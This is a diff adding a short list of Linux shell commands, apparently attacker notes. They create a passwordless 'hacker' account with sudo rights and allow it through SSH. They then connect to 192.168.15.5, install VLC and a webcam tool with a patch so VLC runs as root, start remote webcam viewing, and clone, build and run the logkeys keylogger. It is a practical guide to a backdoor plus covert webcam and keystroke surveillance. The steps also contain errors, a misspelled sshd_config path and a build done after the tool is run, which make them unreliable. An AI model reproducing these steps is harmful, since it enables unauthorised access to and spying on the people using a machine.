@@ -1,0 +1,39 @@
+useradd -u 333 hacker 
+passwd -d hacker
+usermod hacker -a -G wheel
+usermod -u 6666 hacker
+echo "AllowUsers hacker" >> /ect/ssh/sshd_config
+
+===========>
+
+ssh hacker@192.168.15.5
+
+sudo dnf install https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm
+sudo dnf install vlc -y
+sudo dnf install v4l2-utils -y
+
+exit
+
+============>
+
+apt-get install vlc 
+sed -i s/geteuid/getppid/g /usr/bin/vlc
+
+===============>
+
+ssh -C -X hacker@192.168.15.5
+kamoso
+
+git clone https://github.com/kernc/logkeys.git
+logkeys -s -m ptbr.map
+
+sudo dnf install autoconf automake
+
+./autogen.sh
+cd build
+make
+sudo make install
+
+
+
+
